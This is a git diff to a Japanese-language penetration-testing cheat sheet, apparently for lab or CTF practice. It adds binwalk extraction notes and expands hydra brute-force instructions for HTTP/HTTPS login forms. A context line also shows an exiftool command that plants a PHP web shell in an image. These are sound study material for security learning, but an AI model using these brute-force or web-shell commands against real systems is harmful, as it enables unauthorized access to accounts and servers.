@@ -471,6 +471,14 @@ exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ ima
 steghide extract -sf image.jpg
 ```
 
+### binwalk
+ファームウェアイメージを解析して抽出するツール。
+```
+binwalk -Me image.png
+```
+- -e...既知のファイルタイプを自動的に抽出
+- -M...抽出されたファイルを再起的にスキャン
+
 
 ## NFS{RPCbind,Portmapper}(111)
 Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。  
@@ -916,16 +924,22 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 - -L...ユーザーリストファイルの指定
 - -p...単一のパスワードの指定
 - -P...パスワードファイルの指定
-- -s...カスタムポート(sshが22番以外のポートで使用されている時など)
+- -s...カスタムポート(sshが22番以外のポートで使用されている時や、https/443を調べる場合に使用)
 - -f...ログインとパスワードの組み合わせが少なくとも1つ見つかったら終了
-- -V...各試行のログインとパスワードを表示
+- -V...各試行のログインとパスワードを表示(実行中の試行の様子が確認できる)
 
 ### HTTP Post Form
+http-post-formを使用するためには「:」で区切られた3つのパラメータが必要。  
+それぞれ「ログインページのpath」「BurpSuiteなどで取得したリクエスト」「エラーメッセージ」が必要となる。  
+また、ユーザー名が不要なログインページでも「-l」のパラメータの設定が必要なため、「-l none」など適当に指定しておく。
 ```
 hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "<Login Page>:<Request Body>:<Error Message>"
 
 例)
-hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
+http:
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V
+https:
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V -s 443
 ```
 
 ### FTP
